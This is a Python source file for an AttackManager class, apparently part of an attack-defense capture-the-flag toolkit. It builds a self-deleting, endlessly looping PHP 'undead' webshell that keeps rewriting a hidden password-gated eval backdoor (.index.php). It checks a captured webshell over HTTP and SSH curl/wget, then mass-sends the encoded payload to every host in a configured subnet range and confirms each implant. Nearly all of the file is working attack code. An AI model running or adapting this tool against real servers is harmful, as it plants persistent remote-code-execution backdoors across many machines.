import os
import re
import time
import json
import threading
import requests
import base64
from urllib.parse import quote

class AttackManager:
    def __init__(self, ssh_manager):
        self.ssh = ssh_manager
        self.config_file = None
        self.enemy_config = {
            'network_template': '',  # e.g. "172.16.{x}.101"
            'excluded_ips': [],
            'targets': {}  # ip: {status: 'waiting', log: []}
        }
        self.attack_log = []
        
        # Undead Shell Template (Base64 encoded to avoid syntax issues during transfer)
        # Content:
        # <?php
        # ignore_user_abort(true);
        # set_time_limit(0);
        # unlink(__FILE__);
        # $file = '.index.php';
        # $code = '<?php if(md5($_POST["pass"])=="md5_of_pass"){@eval($_POST[a]);} ?>';
        # while (1) {
        #     if (!file_exists($file)) file_put_contents($file, $code);
        #     usleep(50000);
        # }
        # ?>
        self.undead_filename = ".index.php"

    def init_app(self, app):
        self.config_file = os.path.join(app.config['BASE_DIR'], 'data', 'attack_config.json')
        self.load_config()

    def load_config(self):
        if self.config_file and os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    self.enemy_config = json.load(f)
            except: pass

    def save_config(self):
        if self.config_file:
            try:
                with open(self.config_file, 'w') as f:
                    json.dump(self.enemy_config, f, indent=4)
            except: pass

    def set_enemy_config(self, template, excluded_ips_str):
        self.enemy_config['network_template'] = template
        # Parse excluded IPs (comma code)
        self.enemy_config['excluded_ips'] = [x.strip() for x in excluded_ips_str.split(',') if x.strip()]
        self.save_config()
        return {'status': 'ok', 'config': self.enemy_config}

    def generate_undead_shell(self, password):
        """生成不死马 Payload (PHP代码)"""
        # Hardcoded specific MD5 for demo or derived from password
        import hashlib
        pass_md5 = hashlib.md5(password.encode()).hexdigest()
        
        # PHP Shell Code (to be written by undead process)
        # Note: Using 'a' as eval parameter for the implanted shell
        shell_content = f'<?php if(md5($_POST["pass"])=="{pass_md5}"){{@eval($_POST[a]);}} ?>'
        
        # Undead Logic
        php_code = f"""<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '{self.undead_filename}';
$code = '{shell_content}';
while (1) {{
    if (!file_exists($file)) file_put_contents($file, $code);
    usleep(50000);
}}
?>"""
        return php_code

    def verify_exploit_locally(self, local_ip, port, shell_path, password):
        """
        在本地验证 Webshell 可用性及路径
        shell_path: 可能是绝对路径 /var/www/html/shell.php
        return: valid_url_path (e.g., /shell.php) or None
        """
        print(f"DEBUG: Verifying locally {local_ip}:{port} {shell_path} pass={password}")
        
        # Guess URL paths
        # 1. Full path assumption (if path starts with /var/www/html)
        potential_uris = []
        if '/var/www/html/' in shell_path:
            potential_uris.append(shell_path.split('/var/www/html/')[1])
        
        # 2. Filename only
        filename = os.path.basename(shell_path)
        potential_uris.append(filename)
        
        # 3. Relative path check (simple)
        
        # Try connect
        valid_uri = None
        for uri in potential_uris:
            uri = uri.lstrip('/')
            url = f"http://{local_ip}:{port}/{uri}"
            try:
                # Payload: echo 'VULN_CONFIRMED'
                data = {password: "echo 'VULN_CONFIRMED';"}
                res = requests.post(url, data=data, timeout=2)
                if res.status_code == 200 and 'VULN_CONFIRMED' in res.text:
                    print(f"DEBUG: Verified local exploit via {url}")
                    valid_uri = uri
                    break
            except Exception as e:
                print(f"DEBUG: Verify failed for {url}: {e}")
        
        if valid_uri: return valid_uri

        # 4. Fallback: Verify via SSH (Localhost request)
        print(f"DEBUG: Remote verify failed. Assessing local verify via SSH (potential_uris={potential_uris})...")
        for uri in potential_uris:
            uri = uri.lstrip('/')
            payload_key = password
            payload_val = "echo 'VULN_CONFIRMED';"
            
            # --- Method A: curl ---
            cmd_curl = f"curl -s -d \"{payload_key}={payload_val}\" http://127.0.0.1:{port}/{uri}"
            print(f"DEBUG: Trying SSH curl: {cmd_curl}")
            
            try:
                output = self.ssh.execute(local_ip, port, cmd_curl)
                if output and 'VULN_CONFIRMED' in output:
                    print(f"DEBUG: Verified local exploit via SSH (localhost curl): {uri}")
                    valid_uri = uri
                    break
                else:
                    print(f"DEBUG: curl failed, output: {output[:100] if output else 'None'}")
                    # --- Method B: wget ---
                    cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{port}/{uri}"
                    print(f"DEBUG: Trying SSH wget: {cmd_wget}")
                    output = self.ssh.execute(local_ip, port, cmd_wget)
                    if output and 'VULN_CONFIRMED' in output:
                        print(f"DEBUG: Verified local exploit via SSH (localhost wget): {uri}")
                        valid_uri = uri
                        break
                    else:
                        print(f"DEBUG: wget failed, output: {output[:100] if output else 'None'}")

            except Exception as e:
                print(f"DEBUG: SSH Local Verify error for {uri}: {e}")

        return valid_uri

    def start_counter_attack_campaign(self, source_ip, source_port, shell_path, password):
        """启动一波反制攻击"""
        if not self.enemy_config.get('network_template'):
            print("Attack cancelled: No enemy network template.")
            return

        # 1. Verify locally first
        valid_uri = self.verify_exploit_locally(source_ip, source_port, shell_path, password)
        if not valid_uri:
            print("Attack cancelled: Could not verify webshell locally.")
            return
        
        # 2. Generate Enemy IPs
        enemy_ips = self._generate_enemy_ips(source_ip)
        
        # 3. Generate Payload
        payload_code = self.generate_undead_shell(password)
        # We need to send this code via the webshell.
        # Webshell: eval($_POST[password])
        # Payload to send: fputs(fopen('undead.php','w'), '...code...'); include('undead.php');
        # Or simply eval the whole undead code? eval code usually works for one-shot.
        # But undead loop never returns. so we need to spawn it.
        # Better: file_put_contents('u.php', ...); include('u.php');
        
        b64_code = base64.b64encode(payload_code.encode()).decode()
        # Exploitation Code: Write undead shell to disk, then spawn it detached
        exploit_php = f"""
$f='/tmp/.u-{int(time.time())}.php';
file_put_contents($f, base64_decode('{b64_code}'));
include($f);
"""
        # Compact it
        exploit_php = exploit_php.replace('\n', ' ')

        # 4. Launch asynchronously
        threading.Thread(target=self._run_campaign, args=(enemy_ips, source_port, valid_uri, password, exploit_php)).start()

    def _generate_enemy_ips(self, my_ip):
        """
        Template: 172.16.{x}.101
        My IP: 172.16.1.101
        Host ID: 101
        Generates IPs by replacing {x} with 1..254 (excluding my subnet and config exclusions)
        """
        template = self.enemy_config['network_template']
        if '{x}' not in template:
            # Single IP mode
            if template == my_ip: return []
            if template in self.enemy_config['excluded_ips']: return []
            return [template]
        
        # Extract my octets? Not strictly needed if template is explicit.
        # But user wants "Last octet same".
        # If template is "172.16.{x}.101", the host is fixed as 101.
        # User requirement: "attack all with same last octet".
        
        # Let's assume template provides the structure and we iterate {x}.
        ips = []
        for i in range(1, 255):
            ip = template.replace('{x}', str(i))
            # Basic sanity check
            try:
                # Exclude self?
                if ip == my_ip: continue
                # Exclude config
                if ip in self.enemy_config['excluded_ips']: continue
                
                ips.append(ip)
            except: pass
        return ips

    def _run_campaign(self, enemy_ips, port, uri, password, exploit_php):
        print(f"Starting attack campaign against {len(enemy_ips)} targets...")
        
        for ip in enemy_ips:
            self._attack_one(ip, port, uri, password, exploit_php)
            time.sleep(0.1) 

    def _attack_one(self, ip, port, uri, password, exploit_php):
        url = f"http://{ip}:{port}/{uri}"
        target_info = self.enemy_config['targets'].get(ip, {'status': 'waiting', 'logs': []})
        
        try:
            # Send Exploit
            # Note: Requests to blocking PHP scripts (undead loop) will timeout. 
            # This is actually a sign of success if we expect it to loop forever.
            # But usually we spawn it properly so it returns?
            # Our payload `include($f)` will execute the loop and HANG.
            # So we set a very short timeout and catch ReadTimeout as success?
            
            print(f"Attacking {url}...")
            try:
                requests.post(url, data={password: exploit_php}, timeout=1)
                # If it returns 200 immediately, maybe it didn't loop? Or it spawned?
                # The payload contains while(1). It SHOULD timeout.
                result = "exited"
                success = False # It shouldn't exit if loop runs
            except requests.exceptions.ReadTimeout:
                # Timeout means script is running (looping)
                result = "timeout(running)"
                success = True
            except Exception as e:
                result = str(e)
                success = False
            
            status = 'success' if success else 'failed'
            target_info['status'] = status
            target_info['last_msg'] = result
            
            # Verify Implantation?
            # Try to connect to implanted shell: .index.php
            if success:
                time.sleep(1)
                verify_url = f"http://{ip}:{port}/{self.undead_filename}"
                try:
                    res = requests.get(verify_url, timeout=2)
                    if res.status_code == 200:
                        target_info['status'] = 'confirmed'
                    else:
                        target_info['status'] = 'uncertain'
                except:
                    target_info['status'] = 'uncertain'

        except Exception as e:
            target_info['status'] = 'failed'
            target_info['last_msg'] = str(e)
            
        self.enemy_config['targets'][ip] = target_info
        # Notify UI update? (websocket TODO)

    def get_attack_status(self):
        return self.enemy_config
